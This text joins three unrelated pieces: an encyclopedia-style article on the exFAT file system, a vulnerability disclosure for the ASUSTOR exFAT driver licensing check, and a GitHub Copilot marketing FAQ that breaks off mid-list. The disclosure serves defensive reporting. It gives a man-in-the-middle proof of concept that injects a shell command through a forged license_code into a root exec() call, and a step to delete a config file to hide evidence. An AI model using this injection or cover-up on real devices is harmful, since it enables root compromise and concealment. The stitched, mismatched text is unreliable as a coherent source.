**exFAT** (**Extensible File Allocation Table**) is a [file system](/wiki/File_system "File system") optimized for [flash memory](/wiki/Flash_memory "Flash memory") such as [USB flash drives](/wiki/USB_flash_drive "USB flash drive") and [SD cards](/wiki/Secure_Digital "Secure Digital"), that was introduced by [Microsoft](/wiki/Microsoft "Microsoft") in 2006.[[7]](#cite_note-flash-format-9) exFAT was [proprietary](/wiki/Proprietary_format "Proprietary format") until 28 August 2019, when Microsoft published its specification.[[8]](#cite_note-exfatspec-10) Microsoft owns [patents](/wiki/Patent "Patent") on several elements of its design.[[2]](#cite_note-uspatent-4)

exFAT can be used where [NTFS](/wiki/NTFS "NTFS") is not a feasible solution (due to data-structure overhead), but where a greater [file-size limit](/wiki/Large_file_support "Large file support") than that of the standard [FAT32](/wiki/FAT32 "FAT32") file system (i.e. 4 [GB](/wiki/Gigabyte "Gigabyte")) is required.

exFAT has been adopted by the [SD Association](/wiki/SD_Association "SD Association") as the default file system for [SDXC](/wiki/SDXC "SDXC") and [SDUC](/wiki/SDUC "SDUC") cards larger than 32 [GB](/wiki/Gigabyte "Gigabyte").

Windows 8 and later versions natively support exFAT boot, and support the installation of the system in a special way to run in the exFAT volume.

## History

[[edit](/w/index.php?title=ExFAT&action=edit&section=1 "Edit section: History")]

exFAT was introduced in late 2006 as part of [Windows CE 6.0](/wiki/Windows_CE_6.0 "Windows CE 6.0"), an embedded Windows operating system. Support was added to regular Windows with [Windows Vista Service Pack 1](/wiki/Windows_Vista_Service_Pack_1 "Windows Vista Service Pack 1") and [Windows Server 2008](/wiki/Windows_Server_2008 "Windows Server 2008"), both released on February 4, 2008. An update for [Windows XP](/wiki/Windows_XP "Windows XP") and [Windows Server 2003](/wiki/Windows_Server_2003 "Windows Server 2003") was later released.

Most of the vendors signing on for licenses are manufacturers of embedded systems or device manufacturers that produce media formatted with exFAT. The entire [File Allocation Table](/wiki/File_Allocation_Table "File Allocation Table") (FAT) family, exFAT included, is used for embedded systems because it is lightweight and is better suited for solutions that have low memory and low power requirements, and can be easily implemented in [firmware](/wiki/Firmware "Firmware").

## Features

[[edit](/w/index.php?title=ExFAT&action=edit&section=2 "Edit section: Features")]

Because file size references are stored in eight instead of four bytes, the [file size limit](/wiki/Large_file_support "Large file support") has increased to 16 [exabytes](/wiki/Exabyte "Exabyte") (EB) (264 − 1 bytes, or about 1019 bytes, which is otherwise limited by a maximum volume size of 128 [PB](/wiki/Petabyte "Petabyte"),[[nb 2]](#cite_note-NB_Size_File-3) or 257 − 1 bytes), raised from 4 [GB](/wiki/Gigabyte "Gigabyte") (232 − 1 bytes) in a standard FAT32 file system.[[1]](#cite_note-xpkb-1) Therefore, for the typical user, this enables seamless [interoperability](/wiki/Interoperability "Interoperability") between Windows, [Linux](/wiki/Linux "Linux") and macOS platforms for files in excess of 4 GB.

Other specifications, features, and requirements of the exFAT file system include:

* Scalability to large disk sizes: about 128 [PB](/wiki/Petabyte "Petabyte") (257 − 1 bytes)[[9]](#cite_note-11)[[nb 1]](#cite_note-NB_Size_Volume-2) maximum, 512 [TB](/wiki/Terabyte "Terabyte") (249 − 1 bytes) recommended maximum, raised from the 32-bit limit (2 TB for a sector size of 512 bytes) of standard FAT32 partitions.[[10]](#cite_note-12)
* Support for up to 2,796,202 files per [directory](/wiki/Folder_%28computing%29 "Folder (computing)").[[2]](#cite_note-uspatent-4)[[nb 3]](#cite_note-NB_Count_Files-13) Microsoft documents a limit of 65,534 (216 − 2) files per sub-directory for their FAT32 implementation, but other operating systems have no special limit for the number of files in a FAT32 directory. FAT32 implementations in other operating systems allow an unlimited number of files up to the number of available clusters (that is, up to 268,304,373 files on volumes without [long filenames](/wiki/Long_filenames "Long filenames")).[[nb 4]](#cite_note-NB_NUM-CLUST-14)
* Maximum number of files on volume C[*[clarification needed](/wiki/Wikipedia%3APlease_clarify "Wikipedia:Please clarify")*], to 4,294,967,285 (232 − 11, up from about 228 − 11[[nb 4]](#cite_note-NB_NUM-CLUST-14) in standard FAT32).
* Free space allocation and delete performance improved due to introduction of a [free-space bitmap](/wiki/Free-space_bitmap "Free-space bitmap").
* Timestamp granularity of 10 [ms](/wiki/Millisecond "Millisecond") for creation and modified times (down from 2 s on FAT, but not as fine as NTFS's 100 ns).[[2]](#cite_note-uspatent-4)
* Timestamp granularity for last-access time to double seconds (FAT had date only).
* Timestamps come with a [time zone](/wiki/Time_zone "Time zone") marker in offset relative to [UTC](/wiki/UTC "UTC") (starting with [Vista SP2](/wiki/Windows_Vista#Service_Pack_2 "Windows Vista")).[[11]](#cite_note-15)
* Optional support for [access-control lists](/wiki/Access-control_list "Access-control list") (not currently supported in Windows Desktop/Server versions).[[12]](#cite_note-16)
* Optional support for [TexFAT](/wiki/TexFAT "TexFAT"), a transactional file system standard (optionally [WinCE](/wiki/WinCE "WinCE") activated function, not supported in Windows Desktop/Server versions).
* Boundary alignment offset for the FAT table.
* Boundary alignment offset for the data region.
* Provision for OEM-definable parameters to customize the file system for specific device characteristics.[[13]](#cite_note-microsoft.com-17)[[14]](#cite_note-18)
* Valid data length (VDL): through the use of two distinct lengths fields – one for "allocated space" and the other for "valid data" – exFAT can preallocate a file without leaking data that was previously on-disk.
* [Cluster](/wiki/Cluster_%28file_system%29 "Cluster (file system)") size up to 32 MB.[[15]](#cite_note-Microsoft-19)
* Metadata integrity with checksums.[*[clarification needed](/wiki/Wikipedia%3APlease_clarify "Wikipedia:Please clarify")*]
* Template-based metadata structures.[*[clarification needed](/wiki/Wikipedia%3APlease_clarify "Wikipedia:Please clarify")*]
* Removal of the physical `.` and `..` directory entries that appear in subdirectories.
* exFAT no longer stores the short [8.3 filename](/wiki/8.3_filename "8.3 filename") references in directory structure and natively uses extended file names, whereas legacy FAT versions implement extended file names through the [VFAT](/wiki/VFAT "VFAT") extension.

[Windows XP](/wiki/Windows_XP "Windows XP") requires update KB955704 to be installed, and [Windows Vista](/wiki/Windows_Vista "Windows Vista") requires its SP1 installed.[[15]](#cite_note-Microsoft-19)[[16]](#cite_note-20)[[17]](#cite_note-21) Windows Vista is unable to use exFAT drives for [ReadyBoost](/wiki/ReadyBoost "ReadyBoost"). [Windows 7](/wiki/Windows_7 "Windows 7") removes this limitation, enabling ReadyBoost caches larger than 4 GB.[[18]](#cite_note-22) Windows 10 only allows formatting exFAT and NTFS on non-removeable volumes sized larger than 32 GB with the default user interface, and FAT32 format is suggested for smaller volumes; command-line utilities don't accept quick format using FAT32 if volume is larger than 32 GB.

The standard exFAT implementation is not [journaled](/wiki/Journaling_file_system "Journaling file system") and only uses a single file allocation table and free-space map. FAT file systems instead used alternating tables, as this allowed recovery of the file system if the media was ejected during a write (which occurs frequently in practice with removable media). The optional [TexFAT](/wiki/TexFAT "TexFAT") component adds support for additional backup tables and maps, but may not be supported.

The exFAT format allows individual files larger than 4 GB, facilitating long continuous recording of HD video, which can exceed the 4 GB limit in less than an hour. Current digital cameras using FAT32 will break the video files into multiple segments of approximately 2 or 4 GB.

EFS supported in Windows 10 v1607 and Windows Server 2016 or later.[[19]](#cite_note-23)

### Efficiency

[[edit](/w/index.php?title=ExFAT&action=edit&section=3 "Edit section: Efficiency")]

SDXC cards running at [UHS-I](/wiki/UHS-I "UHS-I") have a minimum guaranteed write speed of 10 MB/s, and exFAT plays a factor in achieving this throughput through the reduction of the file-system overhead in cluster allocation. This is achieved through the introduction of a separate cluster bitmap where the reservation state of each cluster (reserved/free) is tracked by only one bit, reducing writes to the much larger FAT that originally served this purpose.

Additionally, a single bit in the directory record indicates that the file is contiguous (unfragmented), telling the exFAT driver to ignore the FAT. This optimization is analogous to an [extent](/wiki/Extent_%28file_systems%29 "Extent (file systems)") in other file systems, except that it only applies to whole files, as opposed to contiguous parts of files.

## Adoption

[[edit](/w/index.php?title=ExFAT&action=edit&section=4 "Edit section: Adoption")]

exFAT is supported in [Windows XP](/wiki/Windows_XP "Windows XP") and [Windows Server 2003](/wiki/Windows_Server_2003 "Windows Server 2003") with update KB955704,[[1]](#cite_note-xpkb-1) [Windows Vista Service Pack 1](/wiki/Windows_Vista#Service_Pack_1 "Windows Vista") and later,[[20]](#cite_note-24) [Windows Server 2008](/wiki/Windows_Server_2008 "Windows Server 2008") and later (except [Server Core](/wiki/Server_Core "Server Core")),[[21]](#cite_note-Server2008exFATsupport-25) [macOS](/wiki/MacOS "MacOS") starting from 10.6.5, [Linux](/wiki/Linux "Linux") via [FUSE](/wiki/Filesystem_in_Userspace "Filesystem in Userspace") or natively starting from kernel 5.4, and [iPadOS](/wiki/IPadOS "IPadOS") as well as iOS starting from 13.1.[[22]](#cite_note-Mac_OS_X_10.6.5_Notes-26)[[23]](#cite_note-fsck_exfat_man-27)[[24]](#cite_note-28)

Companies can integrate exFAT into a specific group of consumer devices, including cameras, camcorders, and digital photo frames for a [flat fee](/wiki/Flat_fee "Flat fee"). Mobile phones, PCs, and networks have a different volume pricing model.[[7]](#cite_note-flash-format-9)

exFAT is supported in a number of media devices such as modern flat-panel TVs,[[25]](#cite_note-29) media centers, and portable media players.[[26]](#cite_note-30)

exFAT is the official file system of [SDXC](/wiki/SDXC "SDXC") cards. Because of this, any device not supporting exFAT, such as the [Nintendo 3DS](/wiki/Nintendo_3DS "Nintendo 3DS"), may not legally advertise itself as SDXC compatible, despite supporting SDXC cards as mass storage devices by formatting the card with FAT32 or a proprietary file system tied to the device in question.

Some vendors of other flash media, including USB pen drives, compact flash (CF) and solid-state drives (SSD) ship some of their high-capacity media pre-formatted with the exFAT file system to ensure compatibility with any given device. For example, Sandisk ships their 256 GB CF cards as exFAT.

Microsoft has entered into licensing agreements with [BlackBerry](/wiki/BlackBerry_Limited "BlackBerry Limited"),[[27]](#cite_note-31)[[28]](#cite_note-32) [Panasonic](/wiki/Panasonic "Panasonic"), [Sanyo](/wiki/Sanyo "Sanyo"), [Sony](/wiki/Sony "Sony"), [Canon](/wiki/Canon_Inc. "Canon Inc."), [Aspen Avionics](/wiki/Aspen_Avionics "Aspen Avionics"),[[29]](#cite_note-33) [Audiovox](/wiki/Audiovox "Audiovox"), [Continental](/wiki/Continental_AG "Continental AG"), [Harman](/wiki/Harman_International_Industries "Harman International Industries"), [LG Automotive](/wiki/LG "LG")[[30]](#cite_note-34) and [BMW](/wiki/BMW "BMW").[[31]](#cite_note-35)

[Mac OS X Snow Leopard](/wiki/Mac_OS_X_Snow_Leopard "Mac OS X Snow Leopard") 10.6.5 and later can create, read, write, verify, and repair exFAT file systems.[[22]](#cite_note-Mac_OS_X_10.6.5_Notes-26)[[23]](#cite_note-fsck_exfat_man-27)

Linux has support for exFAT via [FUSE](/wiki/Filesystem_in_Userspace "Filesystem in Userspace") since 2009.[[4]](#cite_note-exfat-fuse-6) In 2013, [Samsung Electronics](/wiki/Samsung_Electronics "Samsung Electronics") published a Linux [driver](/wiki/Device_driver "Device driver") for exFAT under [GPL](/wiki/GPL "GPL").[[32]](#cite_note-36)
On 28 August 2019, Microsoft published the exFAT specification[[8]](#cite_note-exfatspec-10) and released the patent to the [Open Invention Network](/wiki/Open_Invention_Network "Open Invention Network") members.[[33]](#cite_note-exfatOIN-37) The [Linux kernel](/wiki/Linux_kernel "Linux kernel") introduced native exFAT support with the 5.4 release in November 2019.[[34]](#cite_note-Linux_Kernel_5.4_Release_Features-38)

[ChromeOS](/wiki/ChromeOS "ChromeOS") can read and write to exFAT partitions.[[35]](#cite_note-chromeOS-39)

[OpenHarmony](/wiki/OpenHarmony "OpenHarmony") operating system since 3.1 version in December 2021, alongside [HarmonyOS](/wiki/HarmonyOS "HarmonyOS") platform with [HarmonyOS NEXT](/wiki/HarmonyOS_NEXT "HarmonyOS NEXT") Beta update add native support for read and write exFAT partitions.[[36]](#cite_note-40)

### File name lookup

[[edit](/w/index.php?title=ExFAT&action=edit&section=6 "Edit section: File name lookup")]

exFAT employs a filename hash-based lookup phase to speed certain cases, which is described in US patent *Quick File Name Lookup Using Name Hash*.[[2]](#cite_note-uspatent-4) Appendix A of the document contains details helpful in understanding the file system.

### File and cluster pre-allocation

[[edit](/w/index.php?title=ExFAT&action=edit&section=7 "Edit section: File and cluster pre-allocation")]

Like NTFS, exFAT can pre-allocate disk space for a file by just marking arbitrary space on disk as "allocated". For each file, exFAT uses two separate 64-bit fields in the directory: the valid data length (VDL), which indicates the real size of the file, and the physical data length.

To provide improvement in the allocation of cluster storage for a new file, Microsoft incorporated a method to pre-allocate contiguous clusters and bypass the use of updating the FAT table, which was patented December 10, 2013.[[37]](#cite_note-45) One feature of exFAT (used in the exFAT implementation within embedded systems) provides atomic transactions for the multiple steps of updating the file-system metadata. The feature called *Transaction Safe FAT*, or [TexFAT](/wiki/TexFAT "TexFAT"), was granted a patent on November 3, 2009.[[38]](#cite_note-46)

### Directory file set

[[edit](/w/index.php?title=ExFAT&action=edit&section=8 "Edit section: Directory file set")]

exFAT and the rest of the FAT family of file systems do not use indexes for file names, unlike NTFS, which uses [B-trees](/wiki/B-trees "B-trees") for file searching. When a file is accessed, the directory must be sequentially searched until a match is found. For file names shorter than 16 characters in length, one file name record is required but the entire file is represented by three 32-byte directory records. This is called a directory file set, and a 256 MB sub-directory can hold up to 2,796,202 file sets. (If files have longer names, this number will decrease, but this is the maximum based on the minimal three-record file set.) To help improve the sequential searching of the directories (including the root) a hash value of the file name is derived for each file and stored in the directory record. When searching for a file, the file name is first converted to upper case using the upcase table (file names are case-insensitive) and then hashed using a proprietary patented algorithm into a 16-bit (2-byte) hash value. Each record in the directory is searched by comparing the hash value. When a match is found, the file names are compared to ensure that the proper file was located in case of hash collisions. This improves performance because only 2 bytes have to be compared for each file. This significantly reduces the CPU load because most file names are more than 2 characters (bytes) in size and virtually every comparison is performed on only 2 bytes at a time until the intended file is located.

### Metadata and checksums

[[edit](/w/index.php?title=ExFAT&action=edit&section=9 "Edit section: Metadata and checksums")]

exFAT introduces metadata integrity through the use of checksums. There are three checksums currently in use.

1. The [volume boot record](/wiki/Volume_boot_record "Volume boot record") (VBR) is a 12-sector region that contains the boot records, [BIOS parameter block](/wiki/BIOS_parameter_block "BIOS parameter block") (BPB), OEM parameters and the checksum sector. (There are two VBR type regions, the main VBR and the backup VBR.) The checksum sector is a checksum of the previous 11 sectors, with the exception of three bytes in the boot sector (flags and percent used). This provides integrity of the VBR by determining whether the VBR was modified. The most common cause could be a [boot-sector virus](/wiki/Boot_sector#Boot-sector_viruses "Boot sector"), but this would also catch any other corruption to the VBR.
2. A second checksum is used for the upcase table. This is a static table and should never change. Any corruption in the table could prevent files from being located because this table is used to convert the filenames to upper case when searching to locate a file.
3. The third checksum is in the directory file sets. Multiple directory records are used to define a single file, and this is called a file set. This file set has metadata including the file name, time stamps, attributes, address of first cluster location of the data, file lengths, and the file name. A checksum is taken over the entire file set, and a mismatch would occur if the directory file set was accidentally or maliciously changed.

When the file system is mounted, and the integrity check is conducted, these hashes are verified. Mounting also includes comparison of the version of the exFAT file system by the driver to make sure the driver is compatible with the file system it is trying to mount, and to make sure that none of the required directory records are missing (for example, the directory record for the upcase table and allocation bitmap are required, and the file system can't run if they are missing). If any of these checks fail, the file system should not be mounted, although in certain cases it may mount read-only.

The file system provides extensibility through template-based metadata definitions using generic layouts and generic patterns.[[39]](#cite_note-47)[[40]](#cite_note-48)

### Flash optimizations

[[edit](/w/index.php?title=ExFAT&action=edit&section=10 "Edit section: Flash optimizations")]

exFAT contains a few features that, according to Microsoft, makes it flash-friendly:

* Boundary alignment for filesystem structures. The offsets for the FAT and the cluster heap is adjustable at format time, so that writes to these areas will happen in as few flash blocks as possible.
* An "OEM parameters" field can be used to record features such as block size of the underlying storage. One single type for flash storage is pre-defined.[[41]](#cite_note-CE-flash-49)
* The lack of a [journal](/wiki/Journaling_file_system "Journaling file system"), so that less data is written. (Although FAT32 also lacks a journal.)

The first feature requires support from the formatting software. Compliant implementations will follow existing offsets. The OEM parameter may be ignored. Implementations may also use [TRIM](/wiki/Trim_%28computing%29 "Trim (computing)") to reduce wear.

### Legal status

[[edit](/w/index.php?title=ExFAT&action=edit&section=12 "Edit section: Legal status")]

exFAT was a proprietary file system until 2019, when Microsoft released the specification and allowed [Open Invention Network](/wiki/Open_Invention_Network "Open Invention Network") (OIN) members to use their patents.[[45]](#cite_note-53) This lack of documentation along with the threat of a patent infringement lawsuit, as happened previously when Microsoft sued various companies over the VFAT long file name patent (before it expired), hampered the development of [free and open-source](/wiki/Free_and_open-source "Free and open-source") drivers for exFAT, and led to a situation where Linux distributions could not even tell users how to get an exFAT driver. Accordingly, exFAT official support was effectively limited to Microsoft's own products and those of Microsoft's licensees. This, in turn, inhibited exFAT's adoption as a universal exchange format, as it was safer and easier for vendors to rely on FAT32 than it was to pay Microsoft or risk being sued.

[Interoperability](/wiki/Interoperability "Interoperability") requires that certain results be achieved in a particular, predefined way (an [algorithm](/wiki/Algorithm "Algorithm")). For exFAT, this potentially requires every implementation to perform certain procedures in exactly the same way as Microsoft's implementation. Some of the procedures used by Microsoft's implementation are patented, and these patents are owned by Microsoft.[[46]](#cite_note-exfat-licensing-54) A license to use these algorithms can be purchased from Microsoft,[[47]](#cite_note-55)[[46]](#cite_note-exfat-licensing-54) and some companies – including [Apple](/wiki/Apple_Inc. "Apple Inc."), [Google](/wiki/Google "Google") and [Samsung](/wiki/Samsung "Samsung") – have done so.[[48]](#cite_note-Girard-56) However, in the [open-source ecosystem](/wiki/Business_models_for_open-source_software "Business models for open-source software"), users have typically responded to vendors being unwilling to pay for patent licenses by procuring an implementation for themselves from unofficial sources. For example, this is what happened with [LAME](/wiki/LAME "LAME") when [MP3](/wiki/MP3 "MP3") patents were still valid. (Alternatively, the user may decide that the feature is unimportant to them.)

Regardless of whether open-source or not, Microsoft stated that "a license is required in order to implement exFAT and use it in a product or device".[[46]](#cite_note-exfat-licensing-54) Unlicensed distribution of an exFAT driver would make the distributor liable for financial damages if the driver is found to have violated Microsoft's patents.[[49]](#cite_note-57)[[50]](#cite_note-58) While the patents may not be enforceable, this can only be determined through a legal process, which is expensive and time-consuming. It may also be possible to achieve the intended results without infringing Microsoft's patents.[[51]](#cite_note-59) In October 2018, Microsoft released 60,000 patents to the OIN members for Linux systems, but exFAT patents were not initially included at the time. There was, however, discussion within Microsoft over whether Microsoft should allow exFAT in Linux devices,[[52]](#cite_note-60)[[53]](#cite_note-61) which eventually resulted in Microsoft publishing the official specification for open usage[[8]](#cite_note-exfatspec-10) and releasing the exFAT patents to the OIN in August 2019.[[33]](#cite_note-exfatOIN-37)

### List of implementations

[[edit](/w/index.php?title=ExFAT&action=edit&section=13 "Edit section: List of implementations")]

A [FUSE](/wiki/Filesystem_in_Userspace "Filesystem in Userspace")-based implementation named fuse-exfat, or exfat-fuse,[[4]](#cite_note-exfat-fuse-6) with read/write support is available for [FreeBSD](/wiki/FreeBSD "FreeBSD"), multiple [Linux](/wiki/Linux "Linux") distributions, and older versions of [Mac OS X](/wiki/Mac_OS_X "Mac OS X"). It supports TRIM.[[54]](#cite_note-62)[[55]](#cite_note-63)[[56]](#cite_note-64)[[57]](#cite_note-65)[[58]](#cite_note-66) An implementation called exFATFileSystem, based on fuse-exfat, is available for [AmigaOS 4.1](/wiki/AmigaOS "AmigaOS").[[59]](#cite_note-67)

A Linux kernel implementation by [Samsung Electronics](/wiki/Samsung_Electronics "Samsung Electronics") is available.[[60]](#cite_note-68) It was initially released on [GitHub](/wiki/GitHub "GitHub") unintentionally,[[61]](#cite_note-69) and later released officially by Samsung in compliance with the [GPLv](/wiki/GPL "GPL")2 in 2013.[[62]](#cite_note-70)[[63]](#cite_note-bkuhn-exfat-71) (This release does not make exFAT royalty-free, as licensing from Samsung does not remove Microsoft's patent rights.)[[64]](#cite_note-72)[[65]](#cite_note-73) A version of this driver was first incorporated into version 5.4 of the Linux kernel.[[66]](#cite_note-phoronix_sep_29_2019-74)[[67]](#cite_note-phoronix_nov_17_2019-75)[[68]](#cite_note-phoronix_nov_24_2019-76) A much newer version of the driver, with several bug fixes and improved reliability, was incorporated into kernel 5.7.[[69]](#cite_note-phoronix_jan_20_2020-77)[[42]](#cite_note-phoronix_april_04_2020-50) Prior to its being merged into the Linux kernel, this newer version had already seen adoption on Android smartphones and continued to be used on both Linux and Android thereafter.[[70]](#cite_note-phoronix_dec_30_2019-78)[[71]](#cite_note-phoronix_march_07_2020-79)

Proprietary read/write solutions licensed and derived from the Microsoft exFAT implementation are available for [Android](/wiki/Android_%28operating_system%29 "Android (operating system)"),[[72]](#cite_note-reg120808-80) Linux, and other operating systems from [Paragon Software Group](/wiki/Paragon_Software_Group "Paragon Software Group") and [Tuxera](/wiki/Tuxera "Tuxera").

XCFiles (from [Datalight](/wiki/Datalight "Datalight")) is a proprietary, full-featured implementation, intended to be portable to 32-bit systems.[[73]](#cite_note-81) Rtfs (from EBS Embedded Software) is a full-featured implementation for embedded devices.[[74]](#cite_note-82)

Two experimental, unofficial solutions are available for DOS. The loadable USBEXFAT driver requires Panasonic's USB stack for DOS and only works with USB storage devices; the open-source EXFAT executable is an exFAT file-system reader and requires the [HX DOS](/wiki/HX_DOS "HX DOS") extender to work.[[75]](#cite_note-83) There are no native exFAT real-mode DOS drivers, which would allow usage of, or booting from, exFAT volumes.

The renaming of ExFAT file system labels is natively supported by Microsoft [Windows Explorer](/wiki/Windows_Explorer "Windows Explorer"), while [Linux](/wiki/Linux "Linux") relies on the `exfatlabel` and `tune.exfat` tools (both part of exfatprogs).[[76]](#cite_note-84)

## Notes

[[edit](/w/index.php?title=ExFAT&action=edit&section=15 "Edit section: Notes")]

1. ^ [***a***](#cite_ref-NB_Size_Volume_2-0) [***b***](#cite_ref-NB_Size_Volume_2-1) The theoretical maximum volume size is defined by up to 232 − 11 possible clusters with up to 225 bytes per cluster ≈ 128 PB. The cluster count is limited to 32-bit integers. The cluster size is not limited by data type; it's probably set in consideration of the [LBA48](/wiki/LBA48 "LBA48") addressing scheme, as with a 512-byte sector size, only 248 × 512 = 257 bytes = 128 PB can be addressed.
2. ^ [***a***](#cite_ref-NB_Size_File_3-0) [***b***](#cite_ref-NB_Size_File_3-1)
   Although Microsoft published a different value in KB955704, the file size is in bytes and is stored as a 64-bit number. The largest theoretical file size would be 16 EB − 1 byte, the same as in NTFS. However, since the maximum volume size under the current specification cannot exceed ~128 PB, a file can never reach that file length.
3. **[^](#cite_ref-NB_Count_Files_13-0)** This limit applies because the maximum directory size is 256 MB.
4. ^ [***a***](#cite_ref-NB_NUM-CLUST_14-0) [***b***](#cite_ref-NB_NUM-CLUST_14-1) 268,304,373 files = 228 − 11 reserved clusters − 131,072, the minimum number of 64 KB clusters occupied for the 268,435,445 directory entries (32 bytes) without VFAT LFNs, which are required for 268,435,445 files with sizes between 1 and 65,535 bytes. With VFATs, the 131,072 number must be multiplied by 21 (worst case), which would result in 265,682,933 files instead.

# ASUSTOR exFAT Driver RCE
## Vulnerable Versions
\* ASUSTOR exFAT Driver <= 1.0.0.r20
## References
\* CVE-2019-11688 - TLS validation failure
\* CVE-2019-11689 - Improper input sanitization
## Overview
[exFAT](https://en.wikipedia.org/wiki/ExFAT) is a filesystem designed for external storage devices and is defined as the SD Card Association standard filesystem for SD cards over 32 GB. Because the underlying technology is patented by Microsoft, NAS providers have began selling support for the filesystem as an addon driver.
The ASUSTOR exFAT implementation is available via [App Central](https://www.asustor.com/app\_central/app\_detail?id=776&type=). Once installed, a license key must be entered, which is online validated against an ASUSTOR server.
During this online check, the licensing application is vulnerable to a man-in-the-middle attack and ultimately remote code execution. The licensing application runs as root on the device.
## POC
### Prerequisites
1. Install ASUSTOR exFAT Driver from App Central
2. Intercept TLS traffic to asustornasapi.asustor.com by your preferred means (mitmproxy and DNS interception was used during POC development)
### Exploitation
1. Intercept HTTP POST to ``/test/exfat/AS16xxxxxxxxxxxx``
2. Rewrite server response to
``{"success":true}``
3. Intercept second HTTP POST to ``/test/exfat/AS16xxxxxxxxxxxx``
4. Rewrite server response to
``{"success":true,"registered":true,"license\_code":"';touch /tmp/RCE;echo '"}``
\*Note: Payload is passed directly to exec(), so quotes must be properly matched to avoid shell errors.\*
5. Remove ``/usr/builtin/etc/reg.conf`` file to eliminate any evidence of exploitation.
## Vendor Response
\* 04/27/2019 - Emailed security@asustor.com, received email bounce
\* 04/28/2019 - General support provided an internal contact for security issues
\* 04/29/2019 - Details sent to internal contact
\* 05/02/2019 - ASUSTOR confirms vulnerability and fix, requested disclosure timeline

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
